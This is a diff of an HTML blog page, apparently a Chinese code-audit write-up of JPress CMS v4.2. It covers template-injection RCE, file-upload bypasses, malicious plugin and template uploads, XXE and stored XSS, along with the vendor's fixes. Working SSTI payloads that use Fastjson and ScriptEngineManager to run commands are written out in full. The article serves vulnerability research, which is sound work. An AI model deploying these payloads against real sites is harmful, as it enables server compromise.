@@ -301,26 +301,26 @@
 <h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><ul>
 <li>这个项目的环境搭建会有点烦躁</li>
 </ul>
-<p>项目地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/JPressProjects/jpress" >https://github.com/JPressProjects/jpress<i class="fas fa-external-link-alt"></i></a></p>
+<p>项目地址：<a class="link" target="_blank" rel="noopener" href="https://github.com/JPressProjects/jpress">https://github.com/JPressProjects/jpress<i class="fas fa-external-link-alt"></i></a></p>
 <p>去到 release 页面下，下载 v4.2 版本的，后续会对新版本当中的漏洞进行挖掘。</p>
 <p>下载完毕项目之后，先在项目界面输入命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package</span><br></pre></td></tr></table></figure>
 
 <p>此处比较坑，我遇到的问题是</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/MavenError.png" class>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to execute goal org.apache.maven.plugins:maven-jar-plugin:2.4:jar (default-jar) on project codegen: Execution default-jar of goal org.apache.maven.plugins:maven-jar-plugin:2.4:jar failed: A required class was missing <span class="keyword">while</span> executing org.apache.maven.plugins:maven-jar-plugin:2.4:jar: org/codehaus/plexus/components/io/resources/PlexusIoResourceCollection</span><br></pre></td></tr></table></figure>
 
 <p>将存储 maven 仓库的所有库都删掉即可，接着再执行命令即可。</p>
 <p>搭建完毕之后创建数据库，但不要导入文件，也不要修改任何配置，直接跑项目。</p>
-<p>项目跑起来之后会访问到 <a class="link"   target="_blank" rel="noopener" href="http://localhost:8080/install" >http://localhost:8080/install<i class="fas fa-external-link-alt"></i></a> 下</p>
-
+<p>项目跑起来之后会访问到 <a class="link" target="_blank" rel="noopener" href="http://localhost:8080/install">http://localhost:8080/install<i class="fas fa-external-link-alt"></i></a> 下</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/jpressInstall.png" class>
 
 <p>按照要求完成安装之后，会让你配置一些网站信息。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/installStep3.png" class>
 
 <p>至此，搭建完成！</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/InstallDown.png" class>
 
 <p>在 undertow.txt 中可以修改端口</p>
 <h2 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><h3 id="代码审计准备"><a href="#代码审计准备" class="headerlink" title="代码审计准备"></a>代码审计准备</h3><h4 id="架构理解"><a href="#架构理解" class="headerlink" title="架构理解"></a>架构理解</h4><p>jpress 项目分为前台页面和后台管理界面，前台页面是纯前端的内容，所以漏洞点主要是在后台管理页面这里。</p>
@@ -337,42 +337,42 @@
 </ul>
 <h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>为什么想到这个漏洞呢？原因是在文章 ——&gt; 设置这里面的 “评论邮件通知管理员” 中；官方给出了例子，告诉我们可以用 <code>#(comment.id)</code>，那么猜测这里可能会存在模板渲染问题，此处对应的模板是 Velocity</p>
 <p>进去看与文章评论相关的类，找到是这一个 ———— <code>io.jpress.module.article.controller.front.ArticleController</code>，这里是有关于前台页面当中，对于文章的管理的一个类。我们在 <code>postComment()</code> 方法处下一个断点，这个方法的作用主要是将评论信息保存到数据库，同时还会发送短信通知网站管理员。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ArticleControllerPostComment.png" class>
 
 <p>我们先开启文章评论的功能，如图</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/OpenFunctions.png" class>
 
 <p>接着发布一条评论，来看一看它的运行流程。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/CommentLie.png" class>
 
 <p>前面是一系列的赋值与基础判断，有兴趣的师傅们可以自行调试看一下，属于是很简单的部分。直接看重点部分，第 268 行。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ArticleNotifyKit.png" class>
 
 <p>跟进一下，进入到 <code>notify()</code> 方法，它这里面定义了两种将评论发送给管理员的方式，一种是 Email 的形式，另外一种是 Sms 的形式。我们先跟进 email 的看一下，这里会先判断是否开启了 <code>article_comment_email_notify_enable</code>，如果开启了则进入到 email 的形式当中。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/EmailSuccessSend.png" class>
 
 <p>跟进 <code>doSendEmail()</code> 方法，它去做了 SendEmail 这个动作的具体业务实现。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/doSendEmail.png" class>
 
 <p><code>doSendEmail()</code> 方法前面都是一些基础赋值，到第 90 行看到了模板渲染操作，在第 90 和 91 行，分别对邮件的 emailTitle 和 emailTemplate 调用 <code>getTemplateByString()</code> 方法进行渲染，这两个变量对应 <code>#(comment.id)</code> 处的两个值。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/emailValue.png" class>
 
 <ul>
 <li>而漏洞的触发点实际上是在同一行语句的 <code>renderToString()</code> 方法下。</li>
 </ul>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/renderToString.png" class>
 
 <p>跟进 <code>render()</code> 方法</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/render.png" class>
 
 <p>发现里面存在一个危险方法 <code>exec()</code>，跟进一下，在 <code>exec()</code> 方法当中对输入的评论进行遍历。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/exec.png" class>
 
 <p>连续跟进一下，会到 <code>com.jfinal.template.expr.ast.Method</code> 这个类的 <code>eval()</code> 方法下，对应的调用栈如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">eval:<span class="number">81</span>, Method (com.jfinal.template.expr.ast)</span><br><span class="line">assignVariable:<span class="number">102</span>, Assign (com.jfinal.template.expr.ast)</span><br><span class="line">eval:<span class="number">95</span>, Assign (com.jfinal.template.expr.ast)</span><br><span class="line">exec:<span class="number">57</span>, Set (com.jfinal.template.stat.ast)</span><br><span class="line">exec:<span class="number">68</span>, StatList (com.jfinal.template.stat.ast)</span><br><span class="line">render:<span class="number">74</span>, Template (com.jfinal.template)</span><br><span class="line">renderToString:<span class="number">91</span>, Template (com.jfinal.template)</span><br><span class="line">doSendEmail:<span class="number">91</span>, ArticleNotifyKit (io.jpress.<span class="keyword">module</span>.article.kit)</span><br><span class="line">lambda$byEmail$<span class="number">16</span>:<span class="number">70</span>, ArticleNotifyKit (io.jpress.<span class="keyword">module</span>.article.kit)</span><br><span class="line">run:-<span class="number">1</span>, <span class="number">1607068801</span> (io.jpress.<span class="keyword">module</span>.article.kit.ArticleNotifyKit$$Lambda$<span class="number">79</span>)</span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>
 
 <p>此处就可以很明显的看到存在反射调用任意类的命令执行漏洞</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/MethodInvokeRCE.png" class>
 
 <p>在 Velocity 这个模板引擎当中非常奇妙，先从模板引擎说起，师傅们都知道模板引擎有时候是可以写脚本的，可以进行一些简单的赋值与输出这类的操作。</p>
 <p>在 Velocity 中 <code>&quot;#&quot;</code> 用来标识 Velocity 的脚本语句，包括 <code>#set、#if 、#else、#end、#foreach、#end、#iinclude、#parse、#macro</code> 等；  </p>
@@ -385,13 +385,13 @@
 </ul>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set(x=net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>))</span><br><span class="line">#set(e=x.getEngineByName(<span class="string">&quot;js&quot;</span>))</span><br><span class="line">#(e.eval(<span class="string">&#x27;java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)&#x27;</span>))</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/EvilPayloadContent.png" class>
 
 <p>按照道理来说，这里前台只要输入任意的东西，就可以造成 SSTI To RCE 这么一个效果，但是这里却抛出了异常，具体位置是在 <code>renderToString()</code> 方法调用之后抛出了异常，如图。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/EvilThrowException.png" class>
 
 <p>仔细看一下报错信息：其实是在说，第三行的地方存在着不合法的字符，这个字符其实是单引号。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ErrorInfoSSTI.png" class>
 
 <p>所以这里我们需要用另外一种方式来打，尝试不使用引号构造 payload，构造出了如下 payload，我们将字符串内容通过评论内容进行传入</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#set(str=comment.content)</span><br><span class="line">#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance()) </span><br><span class="line">#(x.setAutoTypeSupport(<span class="literal">true</span>)) </span><br><span class="line">#set(sem=str.substring(<span class="number">0</span>, str.indexOf(<span class="number">124</span>)))</span><br><span class="line">#set(str=str.substring(str.indexOf(<span class="number">124</span>)+<span class="number">1</span>))</span><br><span class="line">#(x.addAccept(sem)) </span><br><span class="line">#set(json=str.substring(<span class="number">0</span>, str.indexOf(<span class="number">124</span>)))</span><br><span class="line">#set(str=str.substring(str.indexOf(<span class="number">124</span>)+<span class="number">1</span>))</span><br><span class="line">#set(x=com.alibaba.fastjson.JSON::parse(json))</span><br><span class="line">#set(js=str.substring(<span class="number">0</span>, str.indexOf(<span class="number">124</span>)))</span><br><span class="line">#set(str=str.substring(str.indexOf(<span class="number">124</span>)+<span class="number">1</span>))</span><br><span class="line">#set(e=x.getEngineByName(js)) </span><br><span class="line">#(e.eval(str))</span><br></pre></td></tr></table></figure>
@@ -400,47 +400,47 @@
 <p>在评论的地方构造 payload</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.script.ScriptEngineManager|&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>&#125;|js|java.lang.Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/BypassPayload.png" class>
 
 <p>攻击成功！</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/SSTIRceSuccess.png" class>
 
 <h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>我认为的修复方式会比较贴近于 Velocity 的一些修复方式，而 Velocity 到目前最新版本也没有提供沙盒或者防御方式，只能禁止或严格过滤用户输入进入 <code>Velocity.evaluate</code>。但是这一框架是作者团队自己编写的，并非 Velocity</p>
 <p>但是在这一个项目当中，我们可以去看一下 jpress V5.0.5 的版本当中是如何修复的，这个地方当时自己找的时候花了很久时间。</p>
 <p>jpress V5.0.5，也就是最新版本当中，是通过转义字符来修补这个漏洞的。挺妙的，代码量小且利用效率高，很强。它的修补手段是在 <code>getPara()</code> 方法处先做一个转义，具体代码的调用栈如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cleanXss:<span class="number">79</span>, XSSHttpServletRequestWrapper (io.jboot.web.xss)</span><br><span class="line">getParameter:<span class="number">32</span>, XSSHttpServletRequestWrapper (io.jboot.web.xss)</span><br><span class="line">getParameter:<span class="number">161</span>, ServletRequestWrapper (javax.servlet)</span><br><span class="line">getPara:<span class="number">189</span>, Controller (com.jfinal.core)</span><br><span class="line">postComment:<span class="number">148</span>, ArticleController (io.jpress.<span class="keyword">module</span>.article.controller.front)</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/cleanXSSDefendSSTI.png" class>
 
 <p>跟进 <code>escapeHtml()</code> 方法，它调用了 <code>replaceEach()</code> 方法，<code>replaceEach()</code> 方法做了转义恶意字符的工作，有兴趣的师傅们可以跟进自行调试一下，很简单。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/replaceEach.png" class>
 
 <h3 id="前台任意文件上传漏洞"><a href="#前台任意文件上传漏洞" class="headerlink" title="前台任意文件上传漏洞"></a>前台任意文件上传漏洞</h3><h4 id="影响接口-1"><a href="#影响接口-1" class="headerlink" title="影响接口"></a>影响接口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ucenter/avatar</span><br></pre></td></tr></table></figure>
 
 <p>漏洞影响域在 <code>/ucenter/avatar</code> 下，这里对应的接口找了很久，最后终于找到是在 <code>io.jpress.web.commons.controller.AttachmentController#upload</code> 处</p>
 <h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>产生漏洞的根本原因是，Web 应用程序允许上传一个 <code>file[]</code> 数组，而非单个文件，从而我们可以构造多个文件同时上传来绕过。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/uploadFileArray.png" class>
 
-
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/V42Upload.png" class>
 
 <p>直接讲代码非常抽象，我们这里先上 payload 打，通过上传多个文件，使后续的文件绕过恶意文件的判断</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/MoreFilesUpload.png" class>
 
 <p>攻击的效果是在 <code>/attachment</code> 文件夹下，能够上传我们的恶意文件，同样能够访问得到。但是这里有个小问题，我尝试上传 jsp 与 jspx 来写🐎，发现无法上传，但是上传 .war 和 .jar 都是可行的，有点奇怪（留个坑）</p>
 <ul>
 <li>具体的运行流程分析如下，先把断点下在 <code>upload()</code> 方法处</li>
 </ul>
 <p>一开始获取文件，并将第 0 个元素赋给 file</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/GetFileIndexZero.png" class>
 
 <p>在执行完 <code>getFile</code> 之后，可以看到，我们上传的文件已经被保存到了临时文件目录，也就是 attachment 目录下，这其实就是一个暂存的动作。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/attachmentUpload.png" class>
 
 <p>紧接着，在65行，判断了文件是否合法，不合法就删除，对应的黑名单在 <code>unSafe()</code> 方法里面。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/UnSafe.png" class>
 
 <p>接着往下走，进行了是否是 image 这个类型的判断，如果是 image 这个类型，则会限制上传的 image 大小。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/UploadLimited.png" class>
 
 <p>至此对于上传文件的限制就结束了，所以我们看到程序对于多个文件的上传并未做严格的限制。通过上传多个文件可以绕过黑名单的判断。</p>
 <blockquote>
@@ -450,7 +450,7 @@
 <li>此处我的想法是不允许将 file 以数组的形式上传</li>
 </ul>
 <p>至于官方的修复也很妙，官方的修复方式是对业务影响最小的修复方式，我们可以来看一看 jpress V5.0.5 的代码</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/uploadFilesJudge.png" class>
 
 <p>先判断在数组文件当中，是否只有一个文件，如果只有一个文件，那么就通过 <code>get(0)</code> 获取到它，如果有多个文件，就将多个文件直接执行 delete 操作。</p>
 <p>妙！</p>
@@ -459,30 +459,30 @@
 <h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>此处允许我们上传 jar 包，并不是允许上传 jar 包就一定会存在漏洞，具体漏洞的情况还要看内部有没有进行一些过滤的手法。</p>
 <p>找了很久对应的接口，最后发现是在 <code>io.jpress.web.admin._AddonController</code> 的<code>doUploadAndInstall()</code> 方法下做的对应业务。</p>
 <p>下个断点，我们先编写一个恶意的 jar 包，接着上传，开始调试。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/uploadJar.png" class>
 
 <p>因为这也是一个文件上传点，所以依旧会存在多个文件绕过的方式。我们继续往下看，在获取到文件后，会判断是否是 zip 或是 jar 的文件类型。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/judgePluginType.png" class>
 
 <p>继续往下，关键语句在 <code>readSimpleAddonInfo()</code> 处，<code>readSimpleAddonInfo()</code> 方法会把我们所有的东西保存到一个 Zip 包里面，当然 jar 包后续会打包成 jar 包。</p>
 <p>继续往下走，到第 118 行，这一个 <code>install()</code> 方法相当关键。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/installJar.png" class>
 
 <p>跟进一下，它会走到 <code>AddonManager#install</code>，也就是开始执行 jar 包的插件安装，在第 206 行，跟进 <code>readAddonInfo()</code> 方法，跟进一下</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/readAddonInfo.png" class>
 
 <p>在这个方法里面会创建一个类加载器来加载插件里的类，这里又复用了一遍 <code>readSimpleAddonInfo()</code> 方法</p>
 
 
 <p>跟进 <code>classLoader.load()</code>，这个方法的作用就是先加载类，然后把不同的类进行归类，Controller 归到一起，Interceptor 归到一起</p>
 <p>先加载类</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/loadClassFive.png" class>
 
 <p>然后根据类的功能进行归类，把他们分别添加到了 addonInfo 的特定字段当中</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/CategoriesClass.png" class>
 
 <p>接下来在处理请求时就会利用到这些 controller，从而实现攻击。现在对于我们来说，访问 helloworld 这一个 controller 即可。执行命令执行。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/EvilHorseCommand.png" class>
 
 <h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><ul>
 <li>官方作者这里并没有给出对应的修复方法……对应的解释如下</li>
@@ -497,33 +497,33 @@
 
 <h4 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>断点下在 <code>io.jpress.web.admin._TemplateController</code> 下的 <code>doInstall()</code> 方法，上传一个恶意的 zip 文件，开始调试。</p>
 <p>一开始会进行判断，是否为 zip 文件</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JudgeZip.png" class>
 
 <p>经过一系列判断之后，到 155 行，155 行这里实际上做了一个文件 move 的操作，将文件先 “暂存”到了对应的文件夹下；到 156 行，进行 zip 压缩包的解压。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/unzip.png" class>
 
 <p>具体的业务就不看了，比较简单，有兴趣的师傅可以跟着调试一下。</p>
 <p>在这之后，evil.zip 就成功被解析成 evil 文件夹，并保存到了对应的文件夹下。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/evilRestore.png" class>
 
 <p>不过模板注入存在些许过滤，我们使用 Fastjson 来辅助获取 <code>ScriptEngineManager</code>，然后执行任意 js 代码，就可以实现 rce，payload 如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance()) </span><br><span class="line">#(x.setAutoTypeSupport(<span class="literal">true</span>)) </span><br><span class="line">#(x.addAccept(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>)) </span><br><span class="line">#set(x=com.alibaba.fastjson.JSON::parse(<span class="string">&#x27;&#123;&quot;@type&quot;:&quot;javax.script.ScriptEngineManager&quot;&#125;&#x27;</span>))</span><br><span class="line">#set(e=x.getEngineByName(<span class="string">&quot;js&quot;</span>)) </span><br><span class="line">#(e.eval(<span class="string">&#x27;java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)&#x27;</span>))</span><br></pre></td></tr></table></figure>
 
 <p>后台这个地方存在一个模板预览功能，这就用到了利用方式</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/preViewFunc.png" class>
 
 <p>开启之后可以通过 get 传入 template 参数来指定使用的模板，比如这里我们指定使用 <code>cn.jeanstudio.bonhumeur</code> 这个模板。而因为我们上传的是一个 html，所以我们可以直接访问 evil&#x2F;?template&#x3D;evil 来攻击</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/EvilInstallTemplates.png" class>
 
 <h4 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>这里漏洞修复的方法比较巧妙，它禁止了在 html 中使用 <code>#set</code> 的调用，所以我们恶意的 payload 无法打成功，对应的过滤语句我没有找到，如果有师傅找到了请指点一下我（我太菜了www</p>
 <h3 id="从-WordPress-中导入文章功能存在-XXE-漏洞-在对应的低版本可以，V4-2-不行"><a href="#从-WordPress-中导入文章功能存在-XXE-漏洞-在对应的低版本可以，V4-2-不行" class="headerlink" title="从 WordPress 中导入文章功能存在 XXE 漏洞(在对应的低版本可以，V4.2 不行)"></a>从 WordPress 中导入文章功能存在 XXE 漏洞(在对应的低版本可以，V4.2 不行)</h3><h4 id="影响接口-4"><a href="#影响接口-4" class="headerlink" title="影响接口"></a>影响接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/setting/tools/wordpress</span><br></pre></td></tr></table></figure>
 
 <h4 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>对应的业务点在 <code>io.jpress.module.article.controller.admin._WordpressImport#doWordPressImport</code> 处</p>
 <p>同样，这也是一个文件上传点，前面的就不看了，直接看 xml 解析的部分。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/wordPressXMLParser.png" class>
 
 <p>跟进 <code>wordPressXmlParser.parse()</code>，里面就是正常的 XML 解析业务，但同时可以发现，此处禁止了 DTD 的使用，所以 V4.2 版本这里是不存在漏洞的。我们来看一看 V4.1.2 也就是存在漏洞的版本中的代码。</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/412WordPressImport.png" class>
 
 <p>V 4.1.2 版本当中未过滤任意 DTD，所以能够造成 XXE 漏洞攻击。</p>
 <p>payload 如下：</p>
@@ -535,10 +535,10 @@
 <h3 id="模板编辑处存在存储型-XSS-在对应的低版本可以，V4-2-不行"><a href="#模板编辑处存在存储型-XSS-在对应的低版本可以，V4-2-不行" class="headerlink" title="模板编辑处存在存储型 XSS(在对应的低版本可以，V4.2 不行)"></a>模板编辑处存在存储型 XSS(在对应的低版本可以，V4.2 不行)</h3><h4 id="影响接口-5"><a href="#影响接口-5" class="headerlink" title="影响接口"></a>影响接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin/template/setting</span><br><span class="line">以及多个模板编辑处，此处不列举</span><br></pre></td></tr></table></figure>
 
 <h4 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在对应的接口处插入 XSS 语句</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/SVGXSS.png" class>
 
 <p>在前端界面处可以直接产生 XSS 的效果</p>
-
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/XSSEffect.png" class>
 
 <ul>
 <li>作者的意思是这里本身就允许编辑代码，所以并非属于漏洞。</li>
@@ -548,7 +548,7 @@
 <h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><ul>
 <li>在 jpress 当中存在的漏洞主要是因为过于信任用户的输入，同时给出的一些修复思路非常有趣，是一个很好的代码审计 CMS</li>
 </ul>
-<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/JPressProjects/jpress/issues" >https://github.com/JPressProjects/jpress/issues<i class="fas fa-external-link-alt"></i></a><br>以及 Erc111111 师傅的帮助 ———— <a class="link"   target="_blank" rel="noopener" href="https://er1cccc.gitee.io/r2/" >https://er1cccc.gitee.io/r2/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a class="link" target="_blank" rel="noopener" href="https://github.com/JPressProjects/jpress/issues">https://github.com/JPressProjects/jpress/issues<i class="fas fa-external-link-alt"></i></a><br>以及 Erc111111 师傅的帮助 ———— <a class="link" target="_blank" rel="noopener" href="https://er1cccc.gitee.io/r2/">https://er1cccc.gitee.io/r2/<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
